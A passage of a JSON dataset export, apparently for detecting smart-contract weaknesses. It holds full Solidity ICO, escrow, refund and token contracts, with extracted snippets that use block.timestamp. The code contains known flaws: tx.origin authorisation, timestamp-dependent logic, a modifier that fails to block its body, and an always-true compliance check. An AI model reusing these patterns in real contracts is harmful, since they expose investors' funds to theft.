bytes;\n struct KYCPayload {\n address whitelistedAddress;\n uint128 customerId;\n uint32 minETH;\n uint32 maxETH;\n uint256 pricingInfo;\n }\n function getKYCPayload(bytes dataframe) public constant returns(address whitelistedAddress, uint128 customerId, uint32 minEth, uint32 maxEth, uint256 pricingInfo) {\n address _whitelistedAddress = dataframe.sliceAddress(0);\n uint128 _customerId = uint128(dataframe.slice16(20));\n uint32 _minETH = uint32(dataframe.slice4(36));\n uint32 _maxETH = uint32(dataframe.slice4(40));\n uint256 _pricingInfo = uint256(dataframe.slice32(44));\n return (_whitelistedAddress, _customerId, _minETH, _maxETH, _pricingInfo);\n }\n}\ncontract KYCPresale is CrowdsaleBase, KYCPayloadDeserializer {\n uint256 public saleWeiCap;\n address public signerAddress;\n event SignerChanged(address signer);\n event Prepurchased(address investor, uint weiAmount, uint tokenAmount, uint128 customerId, uint256 pricingInfo);\n event CapUpdated(uint256 newCap);\n function KYCPresale(address _multisigWallet, uint _start, uint _end, uint _saleWeiCap) CrowdsaleBase(FractionalERC20(address(1)), PricingStrategy(address(0)), _multisigWallet, _start, _end, 0) {\n saleWeiCap = _saleWeiCap;\n }\n function buyWithKYCData(bytes dataframe, uint8 v, bytes32 r, bytes32 s) public payable returns(uint tokenAmount) {\n require(!halted);\n bytes32 hash = sha256(dataframe);\n var (whitelistedAddress, customerId, minETH, maxETH, pricingInfo) = getKYCPayload(dataframe);\n uint multiplier = 10 ** 18;\n address receiver = msg.sender;\n uint weiAmount = msg.value;\n require(ecrecover(hash, v, r, s) == signerAddress);\n if(getState() == State.PreFunding) {\n require(earlyParticipantWhitelist[receiver]);\n } else if(getState() == State.Funding) {\n } else {\n revert();\n }\n if(investedAmountOf[receiver] == 0) {\n investorCount++;\n }\n investedAmountOf[receiver] = investedAmountOf[receiver].plus(weiAmount);\n weiRaised = weiRaised.plus(weiAmount);\n require(!isBreakingCap(weiAmount, tokenAmount, weiRaised, tokensSold));\n require(investedAmountOf[msg.sender] >= minETH * multiplier / 10000);\n require(investedAmountOf[msg.sender] <= maxETH * multiplier / 10000);\n require(multisigWallet.send(weiAmount));\n Prepurchased(receiver, weiAmount, tokenAmount, customerId, pricingInfo);\n return 0;\n }\n function setSignerAddress(address _signerAddress) onlyOwner {\n signerAddress = _signerAddress;\n SignerChanged(signerAddress);\n }\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) constant returns (bool limitBroken) {\n if(weiRaisedTotal > saleWeiCap) {\n return true;\n } else {\n return false;\n }\n }\n function isCrowdsaleFull() public constant returns (bool) {\n return weiRaised >= saleWeiCap;\n }\n function setWeiCap(uint newCap) public onlyOwner {\n saleWeiCap = newCap;\n CapUpdated(newCap);\n }\n function assignTokens(address receiver, uint tokenAmount) internal {\n revert();\n }\n function setPricingStrategy(PricingStrategy _pricingStrategy) onlyOwner {\n }\n function getState() public constant returns (State) {\n if (block.timestamp < startsAt) {\n return State.PreFunding;\n } else {\n return State.Funding;\n }\n }\n}",
  "extract_feature": [
    "function getState() public constant returns (State) {\nif(finalized) return State.Finalized;\nelse if (address(finalizeAgent) == 0) return State.Preparing;\nelse if (!finalizeAgent.isSane()) return State.Preparing;\nelse if (!pricingStrategy.isSane(address(this))) return State.Preparing;\nelse if (block.timestamp < startsAt) return State.PreFunding;\nelse if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\nelse if (isMinimumGoalReached()) return State.Success;\nelse if (!isMinimumGoalReached() && weiRaised > 0 && loadedRefund >= weiRaised) return State.Refunding;\nelse return State.Failure;\n}",
    "function getState() public constant returns (State) {\nif (block.timestamp < startsAt) {\nreturn State.PreFunding;\n} else {\nreturn State.Funding;\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa7fa0e1460cdfa1eb4"
  },
  "filename": "10131.sol",
  "content": "pragma solidity ^0.4.13;\ncontract ComplianceService {\n function validate(address _from, address _to, uint256 _amount) public returns (bool allowed) {\n return true;\n }\n}\ncontract ERC20 {\n function balanceOf(address _owner) public constant returns (uint256 balance);\n function transfer(address _to, uint256 _amount) public returns (bool success);\n function transferFrom(address _from, address _to, uint256 _amount) public returns (bool success);\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining);\n function totalSupply() public constant returns (uint);\n}\ncontract HardcodedWallets {\n address public walletFounder1;\n address public walletFounder2;\n address public walletFounder3;\n address public walletCommunityReserve;\n address public walletCompanyReserve;\n address public walletTeamAdvisors;\n address public walletBountyProgram;\n constructor() public {\n walletFounder1 = 0x5E69332F57Ac45F5fCA43B6b007E8A7b138c2938;\n walletFounder2 = 0x852f9a94a29d68CB95Bf39065BED6121ABf87607;\n walletFounder3 = 0x0a339965e52dF2c6253989F5E9173f1F11842D83;\n walletCommunityReserve = 0xB79116a062939534042d932fe5DF035E68576547;\n walletCompanyReserve = 0xA6845689FE819f2f73a6b9C6B0D30aD6b4a006d8;\n walletTeamAdvisors = 0x0227038b2560dF1abf3F8C906016Af0040bc894a;\n walletBountyProgram = 0xdd401Df9a049F6788cA78b944c64D21760757D73;\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract System {\n using SafeMath for uint256;\n address owner;\n modifier onlyOwner() {\n if (msg.sender != owner) {\n error('System: onlyOwner function called by user that is not owner');\n } else {\n _;\n }\n }\n function error(string _error) internal {\n revert(_error);\n }\n function whoAmI() public constant returns (address) {\n return msg.sender;\n }\n function timestamp() public constant returns (uint256) {\n return block.timestamp;\n }\n function contractBalance() public constant returns (uint256) {\n return address(this).balance;\n }\n constructor() public {\n owner = msg.sender;\n if(owner == 0x0) error('System constructor: Owner address is 0x0');\n }\n event Error(string _error);\n event DebugUint256(uint256 _data);\n}\ncontract Escrow is System, HardcodedWallets {\n using SafeMath for uint256;\n mapping (address => uint256) public deposited;\n uint256 nextStage;\n address public addressSCICO;\n address public addressSCTokens;\n Tokens public SCTokens;\n constructor() public {\n uint256 totalSupply = 1350000000 ether;\n deposited[this] = totalSupply.mul(50).div(100);\n deposited[walletCommunityReserve] = totalSupply.mul(20).div(100);\n deposited[walletCompanyReserve] = totalSupply.mul(14).div(100);\n deposited[walletTeamAdvisors] = totalSupply.mul(15).div(100);\n deposited[walletBountyProgram] = totalSupply.mul(1).div(100);\n }\n function deposit(uint256 _amount) public returns (bool) {\n if (msg.sender != addressSCICO) {\n error('Escrow: not allowed to deposit');\n return false;\n }\n deposited[this] = deposited[this].add(_amount);\n return true;\n }\n function withdraw(address _address, uint256 _amount) public onlyOwner returns (bool) {\n if (deposited[_address]<_amount) {\n error('Escrow: not enough balance');\n return false;\n }\n deposited[_address] = deposited[_address].sub(_amount);\n return SCTokens.transfer(_address, _amount);\n }\n function fundICO(uint256 _amount, uint8 _stage) public returns (bool) {\n if(nextStage !=_stage) {\n error('Escrow: ICO stage already funded');\n return false;\n }\n if (msg.sender != addressSCICO || tx.origin != owner) {\n error('Escrow: not allowed to fund the ICO');\n return false;\n }\n if (deposited[this]<_amount) {\n error('Escrow: not enough balance');\n return false;\n }\n bool success = SCTokens.transfer(addressSCICO, _amount);\n if(success) {\n deposited[this] = deposited[this].sub(_amount);\n nextStage++;\n emit FundICO(addressSCICO, _amount);\n }\n return success;\n }\n function setMyICOContract(address _SCICO) public onlyOwner {\n addressSCICO = _SCICO;\n }\n function setTokensContract(address _addressSCTokens) public onlyOwner {\n addressSCTokens = _addressSCTokens;\n SCTokens = Tokens(_addressSCTokens);\n }\n function balanceOf(address _address) public constant returns (uint256 balance) {\n return deposited[_address];\n }\n event FundICO(address indexed _addressICO, uint256 _amount);\n}\ncontract RefundVault is HardcodedWallets, System {\n using SafeMath for uint256;\n enum State { Active, Refunding, Closed }\n mapping (address => uint256) public deposited;\n mapping (address => uint256) public tokensAcquired;\n State public state;\n address public addressSCICO;\n modifier onlyICOContract() {\n if (msg.sender != addressSCICO) {\n error('RefundVault: onlyICOContract function called by user that is not ICOContract');\n } else {\n _;\n }\n }\n constructor() public {\n state = State.Active;\n }\n function weisDeposited(address _investor) public constant returns (uint256) {\n return deposited[_investor];\n }\n function getTokensAcquired(address _investor) public constant returns (uint256) {\n return tokensAcquired[_investor];\n }\n function deposit(address _investor, uint256 _tokenAmount) onlyICOContract public payable returns (bool) {\n if (state != State.Active) {\n error('deposit: state != State.Active');\n return false;\n }\n deposited[_investor] = deposited[_investor].add(msg.value);\n tokensAcquired[_investor] = tokensAcquired[_investor].add(_tokenAmount);\n return true;\n }\n function close() onlyICOContract public returns (bool) {\n if (state != State.Active) {\n error('close: state != State.Active');\n return false;\n }\n state = State.Closed;\n walletFounder1.transfer(address(this).balance.mul(33).div(100));\n walletFounder2.transfer(address(this).balance.mul(50).div(100));\n walletFounder3.transfer(address(this).balance);\n emit Closed();\n return true;\n }\n function enableRefunds() onlyICOContract public returns (bool) {\n if (state != State.Active) {\n error('enableRefunds: state != State.Active');\n return false;\n }\n state = State.Refunding;\n emit RefundsEnabled();\n return true;\n }\n function refund(address _investor) onlyICOContract public returns (bool) {\n if (state != State.Refunding) {\n error('refund: state != State.Refunding');\n return false;\n }\n if (deposited[_investor] == 0) {\n error('refund: no deposit to refund');\n return false;\n }\n uint256 depositedValue = deposited[_investor];\n deposited[_investor] = 0;\n tokensAcquired[_investor] = 0;\n _investor.transfer(depositedValue);\n emit Refunded(_investor, depositedValue);\n return true;\n }\n function isRefunding() public constant returns (bool) {\n return (state == State.Refunding);\n }\n function setMyICOContract(address _SCICO) public onlyOwner {\n require(address(this).balance == 0);\n addressSCICO = _SCICO;\n }\n event Closed();\n event RefundsEnabled();\n event Refunded(address indexed beneficiary, uint256 weiAmount);\n}\ncontract Haltable is System {\n bool public halted;\n modifier stopInEmergency {\n if (halted) {\n error('Haltable: stopInEmergency function called and contract is halted');\n } else {\n _;\n }\n }\n modifier onlyInEmergency {\n if (!halted) {\n error('Haltable: onlyInEmergency function called and contract is not halted');\n } {\n _;\n }\n }\n function halt() external onlyOwner {\n halted = true;\n emit Halt(true, msg.sender, timestamp());\n }\n function unhalt() external onlyOwner onlyInEmergency {\n halted = false;\n emit Halt(false, msg.sender, timestamp());\n }\n event Halt(bool _switch, address _halter, uint256 _timestamp);\n}\ncontract ICO is HardcodedWallets, Haltable {\n Tokens public SCTokens;\n RefundVault public SCRefundVault;\n Whitelist public SCWhitelist;\n Escrow public SCEscrow;\n uint256 public startTime;\n uint256 public endTime;\n bool public isFinalized = false;\n uint256 public weisPerBigToken;\n uint256 public weisPerEther;\n uint256 public tokensPerEther;\n uint256 public bigTokensPerEther;\n uint256 public weisRaised;\n uint256 public etherHardCap;\n uint256 public tokensHardCap;\n uint256 public weisHardCap;\n uint256 public weisMinInvestment;\n uint256 public etherSoftCap;\n uint256 public tokensSoftCap;\n uint256 public weisSoftCap;\n uint256 public discount;\n uint256 discountedPricePercentage;\n uint8 ICOStage;\n function () payable public {\n buyTokens();\n }\n function buyTokens() public stopInEmergency payable returns (bool) {\n if (msg.value == 0) {\n error('buyTokens: ZeroPurchase');\n return false;\n }\n uint256 tokenAmount = buyTokensLowLevel(msg.sender, msg.value);\n if (!SCRefundVault.deposit.value(msg.value)(msg.sender, tokenAmount)) {\n revert('buyTokens: unable to transfer collected funds from ICO contract to Refund Vault');\n }\n emit BuyTokens(msg.sender, msg.value, tokenAmount);\n return true;\n }\n function buyTokensLowLevel(address _beneficiary, uint256 _weisAmount) private stopInEmergency returns (uint256 tokenAmount) {\n if (_beneficiary == 0x0) {\n revert('buyTokensLowLevel: _beneficiary == 0x0');\n }\n if (timestamp() < startTime || timestamp() > endTime) {\n revert('buyTokensLowLevel: Not withinPeriod');\n }\n if (!SCWhitelist.isInvestor(_beneficiary)) {\n revert('buyTokensLowLevel: Investor is not registered on the whitelist');\n }\n if (isFinalized) {\n revert('buyTokensLowLevel: ICO is already finalized');\n }\n if (_weisAmount < weisMinInvestment) {\n revert('buyTokensLowLevel: Minimal investment not reached. Not enough ethers to perform the minimal purchase');\n }\n if (weisRaised.add(_weisAmount) > weisHardCap) {\n revert('buyTokensLowLevel: HardCap reached. Not enough tokens on ICO contract to perform this purchase');\n }\n tokenAmount = _weisAmount.mul(weisPerEther).div(weisPerBigToken);\n tokenAmount = tokenAmount.mul(100).div(discountedPricePercentage);\n weisRaised = weisRaised.add(_weisAmount);\n if (!SCTokens.transfer(_beneficiary, tokenAmount)) {\n revert('buyTokensLowLevel: unable to transfer tokens from ICO contract to beneficiary');\n }\n emit BuyTokensLowLevel(msg.sender, _beneficiary, _weisAmount, tokenAmount);\n return tokenAmount;\n }\n function updateEndTime(uint256 _endTime) onlyOwner public returns (bool) {\n endTime = _endTime;\n emit UpdateEndTime(_endTime);\n }\n function finalize(bool _forceRefund) onlyOwner public returns (bool) {\n if (isFinalized) {\n error('finalize: ICO is already finalized.');\n return false;\n }\n if (weisRaised >= weisSoftCap && !_forceRefund) {\n if (!SCRefundVault.close()) {\n error('finalize: SCRefundVault.close() failed');\n return false;\n }\n } else {\n if (!SCRefundVault.enableRefunds()) {\n error('finalize: SCRefundVault.enableRefunds() failed');\n return false;\n }\n if(_forceRefund) {\n emit ForceRefund();\n }\n }\n uint256 balanceAmount = SCTokens.balanceOf(this);\n if (!SCTokens.transfer(address(SCEscrow), balanceAmount)) {\n error('finalize: unable to return remaining ICO tokens');\n return false;\n }\n if(!SCEscrow.deposit(balanceAmount)) {\n error('finalize: unable to return remaining ICO tokens');\n return false;\n }\n isFinalized = true;\n emit Finalized();\n return true;\n }\n function claimRefund() public stopInEmergency returns (bool) {\n if (!isFinalized) {\n error('claimRefund: ICO is not yet finalized.');\n return false;\n }\n if (!SCRefundVault.isRefunding()) {\n error('claimRefund: RefundVault state != State.Refunding');\n return false;\n }\n uint256 tokenAmount = SCRefundVault.getTokensAcquired(msg.sender);\n emit GetBackTokensOnRefund(msg.sender, this, tokenAmount);\n if (!SCTokens.refundTokens(msg.sender, tokenAmount)) {\n error('claimRefund: unable to transfer investor tokens to ICO contract before refunding');\n return false;\n }\n if (!SCRefundVault.refund(msg.sender)) {\n error('claimRefund: SCRefundVault.refund() failed');\n return false;\n }\n return true;\n }\n function fundICO() public onlyOwner {\n if (!SCEscrow.fundICO(tokensHardCap, ICOStage)) {\n revert('ICO funding failed');\n }\n }\n event BuyTokens(address indexed _purchaser, uint256 _value, uint256 _amount);\n event BuyTokensOraclePayIn(address indexed _purchaser, address indexed _beneficiary, uint256 _weisAmount, uint256 _tokenAmount);\n event BuyTokensLowLevel(address indexed _purchaser, address indexed _beneficiary, uint256 _value, uint256 _amount);\n event Finalized();\n event ForceRefund();\n event GetBackTokensOnRefund(address _from, address _to, uint256 _amount);\n event UpdateEndTime(uint256 _endTime);\n}\ncontract ICOPreSale is ICO {\n constructor(address _SCEscrow, address _SCTokens, address _SCWhitelist, address _SCRefundVault) public {\n if (_SCTokens == 0x0) {\n revert('Tokens Constructor: _SCTokens == 0x0');\n }\n if (_SCWhitelist == 0x0) {\n revert('Tokens Constructor: _SCWhitelist == 0x0');\n }\n if (_SCRefundVault == 0x0) {\n revert('Tokens Constructor: _SCRefundVault == 0x0');\n }\n SCTokens = Tokens(_SCTokens);\n SCWhitelist = Whitelist(_SCWhitelist);\n SCRefundVault = RefundVault(_SCRefundVault);\n weisPerEther = 1 ether;\n startTime = timestamp();\n endTime = timestamp().add(24 days);\n bigTokensPerEther = 7500;\n tokensPerEther = bigTokensPerEther.mul(weisPerEther);\n discount = 45;\n discountedPricePercentage = 100;\n discountedPricePercentage = discountedPricePercentage.sub(discount);\n weisMinInvestment = weisPerEther.mul(1);\n etherHardCap = 8067;\n tokensHardCap = tokensPerEther.mul(etherHardCap).mul(100).div(discountedPricePercentage);\n weisPerBigToken = weisPerEther.div(bigTokensPerEther);\n weisHardCap = weisPerEther.mul(etherHardCap);\n etherSoftCap = 750;\n weisSoftCap = weisPerEther.mul(etherSoftCap);\n SCEscrow = Escrow(_SCEscrow);\n ICOStage = 0;\n }\n}\ncontract Tokens is HardcodedWallets, ERC20, Haltable {\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public _totalSupply;\n string public name;\n string public symbol;\n uint8 public decimals;\n string public standard = 'H0.1';\n uint256 public timelockEndTime;\n address public addressSCICO;\n address public addressSCEscrow;\n address public addressSCComplianceService;\n ComplianceService public SCComplianceService;\n modifier notTimeLocked() {\n if (now < timelockEndTime && msg.sender != addressSCICO && msg.sender != addressSCEscrow) {\n error('notTimeLocked: Timelock still active. Function is yet unavailable.');\n } else {\n _;\n }\n }\n constructor(address _addressSCEscrow, address _addressSCComplianceService) public {\n name = \"TheRentalsToken\";\n symbol = \"TRT\";\n decimals = 18;\n _totalSupply = 1350000000 ether;\n timelockEndTime = timestamp().add(45 days);\n addressSCEscrow = _addressSCEscrow;\n addressSCComplianceService = _addressSCComplianceService;\n SCComplianceService = ComplianceService(addressSCComplianceService);\n balances[_addressSCEscrow] = _totalSupply;\n emit Transfer(0x0, _addressSCEscrow, _totalSupply);\n }\n function totalSupply() public constant returns (uint) {\n return _totalSupply - balances[address(0)];\n }\n function balanceOf(address _owner) public constant returns (uint256 balance) {\n return balances[_owner];\n }\n function transfer(address _to, uint256 _amount) public notTimeLocked stopInEmergency returns (bool success) {\n if (balances[msg.sender] < _amount) {\n error('transfer: the amount to transfer is higher than your token balance');\n return false;\n }\n if(!SCComplianceService.validate(msg.sender, _to, _amount)) {\n error('transfer: not allowed by the compliance service');\n return false;\n }\n balances[msg.sender] = balances[msg.sender].sub(_amount);\n balances[_to] = balances[_to].add(_amount);\n emit Transfer(msg.sender, _to, _amount);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _amount) public notTimeLocked stopInEmergency returns (bool success) {\n if (balances[_from] < _amount) {\n error('transferFrom: the amount to transfer is higher than the token balance of the source');\n return false;\n }\n if (allowed[_from][msg.sender] < _amount) {\n error('transferFrom: the amount to transfer is higher than the maximum token transfer allowed by the source');\n return false;\n }\n if(!SCComplianceService.validate(_from, _to, _amount)) {\n error('transfer: not allowed by the compliance service');\n return false;\n }\n balances[_from] = balances[_from].sub(_amount);\n balances[_to] = balances[_to].add(_amount);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);\n emit Transfer(_from, _to, _amount);\n return true;\n }\n function approve(address _spender, uint256 _amount) public returns (bool success) {\n allowed[msg.sender][_spender] = _amount;\n emit Approval(msg.sender, _spender, _amount);\n return true;\n }\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n function increaseApproval(address _spender, uint _addedValue) public returns (bool) {\n allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function refundTokens(address _from, uint256 _amount) public notTimeLocked stopInEmergency returns (bool success) {\n if (tx.origin != _from) {\n error('refundTokens: tx.origin did not request the refund directly');\n return false;\n }\n if (addressSCICO != msg.sender) {\n error('refundTokens: caller is not the current ICO address');\n return false;\n }\n if (balances[_from] < _amount) {\n error('refundTokens: the amount to transfer is higher than your token balance');\n return false;\n }\n if(!SCComplianceService.validate(_from, addressSCICO, _amount)) {\n error('transfer: not allowed by the compliance service');\n return false;\n }\n balances[_from] = balances[_from].sub(_amount);\n balances[addressSCICO] = balances[addressSCICO].add(_amount);\n emit Transfer(_from, addressSCICO, _amount);\n return true;\n }\n function setMyICOContract(address _SCICO) public onlyOwner {\n addressSCICO = _SCICO;\n }\n function setComplianceService(address _addressSCComplianceService) public onlyOwner {\n addressSCComplianceService = _addressSCComplianceService;\n SCComplianceService = ComplianceService(addressSCComplianceService);\n }\n function updateTimeLock(uint256 _timelockEndTime) onlyOwner public returns (bool) {\n timelockEndTime = _timelockEndTime;\n emit UpdateTimeLock(_timelockEndTime);\n return true;\n }\n event Transfer(address indexed _from, address indexed _to, uint256 _amount);\n event Approval(address indexed _owner, address indexed _spender, uint256 _amount);\n event UpdateTimeLock(uint256 _timelockEndTime);\n}\ncontract Whitelist is HardcodedWallets, System {\n mapping (address => bool) public walletsICO;\n mapping (address => bool) public managers;\n function isInvestor(address _wallet) public constant returns (bool) {\n return (walletsICO[_wallet]);\n }\n function addInvestor(address _wallet) external isManager returns (bool) {\n if (walletsICO[_wallet]) {\n error('addInvestor: this wallet has been previously granted as ICO investor');\n return false;\n }\n walletsICO[_wallet] = true;\n emit AddInvestor(_wallet, timestamp());\n return true;\n }\n modifier isManager(){\n if (managers[msg.sender] || msg.sender == owner) {\n _;\n } else {\n error(\"isManager: called by user that is not owner or manager\");\n }\n }\n function addManager(address _managerAddr) external onlyOwner returns (bool) {\n if(managers[_managerAddr]){\n error(\"addManager: manager account already exists.\");\n return false;\n }\n managers[_managerAddr] = true;\n emit AddManager(_managerAddr, timestamp());\n }\n function delManager(address _managerAddr) external onlyOwner returns (bool) {\n if(!managers[_managerAddr]){\n error(\"delManager: manager account not found.\");\n return false;\n }\n delete managers[_managerAddr];\n emit DelManager(_managerAddr, timestamp());\n }\n event AddInvestor(address indexed _wallet, uint256 _timestamp);\n event AddManager(address indexed _managerAddr, uint256 _timestamp);\n event DelManager(address indexed _managerAddr, uint256 _timestamp);\n}",
  "extract_feature": [
    "function timestamp() public constant returns (uint256) {\nreturn block.timestamp;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa7fa0e1460cdfa1eb5"
  },
  "filename": "10133.sol",
  "content": "pragma solidity ^0.4.23;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract System {\n using SafeMath for uint256;\n address owner;\n modifier onlyOwner() {\n if (msg.sender != owner) {\n error('System: onlyOwner function called by user that is not owner');\n } else {\n _;\n }\n }\n function error(string _error) internal {\n revert(_error);\n }\n function whoAmI() public constant returns (address) {\n return msg.sender;\n }\n function timestamp() public constant returns (uint256) {\n return block.timestamp;\n }\n function contractBalance() public constant returns (uint256) {\n return address(this).balance;\n }\n constructor() public {\n owner = msg.sender;\n if(owner == 0x0) error('System constructor: Owner address is 0x0');\n }\n event Error(string _error);\n event DebugUint256(uint256 _data);\n}\ncontract Haltable is System {\n bool public halted;\n modifier stopInEmergency {\n if (halted) {\n error('Haltable: stopInEmergency function called and contract is halted');\n } else {\n _;\n }\n }\n modifier onlyInEmergency {\n if (!halted) {\n error('Haltable: onlyInEmergency function called and contract is not halted');\n } {\n _;\n }\n }\n function halt() external onlyOwner {\n halted = true;\n emit Halt(true, msg.sender, timestamp());\n }\n function unhalt() external onlyOwner onlyInEmergency {\n halted = false;\n emit Halt(false, msg.sender, timestamp());\n }\n event Halt(bool _switch, address _halter, uint256 _timestamp);\n}\ncontract HardcodedWallets {\n address public walletFounder1;\n address public walletFounder2;\n address public walletFounder3;\n address public walletCommunityReserve;\n address public walletCompanyReserve;\n address public walletTeamAdvisors;\n address public walletBountyProgram;\n constructor() public {\n walletFounder1 = 0x5E69332F57Ac45F5fCA43B6b007E8A7b138c2938;\n walletFounder2 = 0x852f9a94a29d68CB95Bf39065BED6121ABf87607;\n walletFounder3 = 0x0a339965e52dF2c6253989F5E9173f1F11842D83;\n walletCommunityReserve = 0xB79116a062939534042d932fe5DF035E68576547;\n walletCompanyReserve = 0xA6845689FE819f2f73a6b9C6B0D30aD6b4a006d8;\n walletTeamAdvisors = 0x0227038b2560dF1abf3F8C906016Af0040bc894a;\n walletBountyProgram = 0xdd401Df9a049F6788cA78b944c64D21760757D73;\n }\n}\ncontract ERC20 {\n function balanceOf(address _owner) public constant returns (uint256 balance);\n function transfer(address _to, uint256 _amount) public returns (bool success);\n function transferFrom(address _from, address _to, uint256 _amount) public returns (bool success);\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining);\n function totalSupply() public constant returns (uint);\n}\ncontract Escrow is System, HardcodedWallets {\n using SafeMath for uint256;\n mapping (address => uint256) public deposited;\n uint256 nextStage;\n address public addressSCICO;\n address public addressSCTokens;\n Tokens public SCTokens;\n constructor() public {\n uint256 totalSupply = 1350000000 ether;\n deposited[this] = totalSupply.mul(50).div(100);\n deposited[walletCommunityReserve] = totalSupply.mul(20).div(100);\n deposited[walletCompanyReserve] = totalSupply.mul(14).div(100);\n deposited[walletTeamAdvisors] = totalSupply.mul(15).div(100);\n deposited[walletBountyProgram] = totalSupply.mul(1).div(100);\n }\n function deposit(uint256 _amount) public returns (bool) {\n if (msg.sender != addressSCICO) {\n error('Escrow: not allowed to deposit');\n return false;\n }\n deposited[this] = deposited[this].add(_amount);\n return true;\n }\n function withdraw(address _address, uint256 _amount) public onlyOwner returns (bool) {\n if (deposited[_address]<_amount) {\n error('Escrow: not enough balance');\n return false;\n }\n deposited[_address] = deposited[_address].sub(_amount);\n return SCTokens.transfer(_address, _amount);\n }\n function fundICO(uint256 _amount, uint8 _stage) public returns (bool) {\n if(nextStage !=_stage) {\n error('Escrow: ICO stage already funded');\n return false;\n }\n if (msg.sender != addressSCICO || tx.origin != owner) {\n error('Escrow: not allowed to fund the ICO');\n return false;\n }\n if (deposited[this]<_amount) {\n error('Escrow: not enough balance');\n return false;\n }\n bool success = SCTokens.transfer(addressSCICO, _amount);\n if(success) {\n deposited[this] = deposited[this].sub(_amount);\n nextStage++;\n emit FundICO(addressSCICO, _amount);\n }\n return success;\n }\n function setMyICOContract(address _SCICO) public onlyOwner {\n addressSCICO = _SCICO;\n }\n function setTokensContract(address _addressSCTokens) public onlyOwner {\n addressSCTokens = _addressSCTokens;\n SCTokens = Tokens(_addressSCTokens);\n }\n function balanceOf(address _address) public constant returns (uint256 balance) {\n return deposited[_address];\n }\n event FundICO(address indexed _addressICO, uint256 _amount);\n}\ncontract ComplianceService {\n function validate(address _from, address _to, uint256 _amount) public returns (bool allowed) {\n return true;\n }\n}\ncontract Tokens is HardcodedWallets, ERC20, Haltable {\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public _totalSupply;\n string public name;\n string public symbol;\n uint8 public decimals;\n string public standard = 'H0.1';\n uint256 public timelockEndTime;\n address public addressSCICO;\n address public addressSCEscrow;\n address public addressSCComplianceService;\n ComplianceService public SCComplianceService;\n modifier notTimeLocked() {\n if (now < timelockEndTime && msg.sender != addressSCICO && msg.sender != addressSCEscrow) {\n error('notTimeLocked: Timelock still active. Function is yet unavailable.');\n } else {\n _;\n }\n }\n constructor(address _addressSCEscrow, address _addressSCComplianceService) public {\n name = \"TheRentalsToken\";\n symbol = \"TRT\";\n decimals = 18;\n _totalSupply = 1350000000 ether;\n timelockEndTime = timestamp().add(45 days);\n addressSCEscrow = _addressSCEscrow;\n addressSCComplianceService = _addressSCComplianceService;\n SCComplianceService = ComplianceService(addressSCComplianceService);\n balances[_addressSCEscrow] = _totalSupply;\n emit Transfer(0x0, _addressSCEscrow, _totalSupply);\n }\n function totalSupply() public constant returns (uint) {\n return _totalSupply - balances[address(0)];\n }\n function balanceOf(address _owner) public constant returns (uint256 balance) {\n return balances[_owner];\n }\n function transfer(address _to, uint256 _amount) public notTimeLocked stopInEmergency returns (bool success) {\n if (balances[msg.sender] < _amount) {\n error('transfer: the amount to transfer is higher than your token balance');\n return false;\n }\n if(!SCComplianceService.validate(msg.sender, _to, _amount)) {\n error('transfer: not allowed by the compliance service');\n return false;\n }\n balances[msg.sender] = balances[msg.sender].sub(_amount);\n balances[_to] = balances[_to].add(_amount);\n emit Transfer(msg.sender, _to, _amount);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _amount) public notTimeLocked stopInEmergency returns (bool success) {\n if (balances[_from] < _amount) {\n error('transferFrom: the amount to transfer is higher than the token balance of the source');\n return false;\n }\n if (allowed[_from][msg.sender] < _amount) {\n error('transferFrom: the amount to transfer is higher than the maximum token transfer allowed by the source');\n return false;\n }\n if(!SCComplianceService.validate(_from, _to, _amount)) {\n error('transfer: not allowed by the compliance service');\n return false;\n }\n balances[_from] = balances[_from].sub(_amount);\n balances[_to] = balances[_to].add(_amount);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);\n emit Transfer(_from, _to, _amount);\n return true;\n }\n function approve(address _spender, uint256 _amount) public returns (bool success) {\n allowed[msg.sender][_spender] = _amount;\n emit Approval(msg.sender, _spender, _amount);\n return true;\n }\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n function increaseApproval(address _spender, uint _addedValue) public returns (bool) {\n allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) 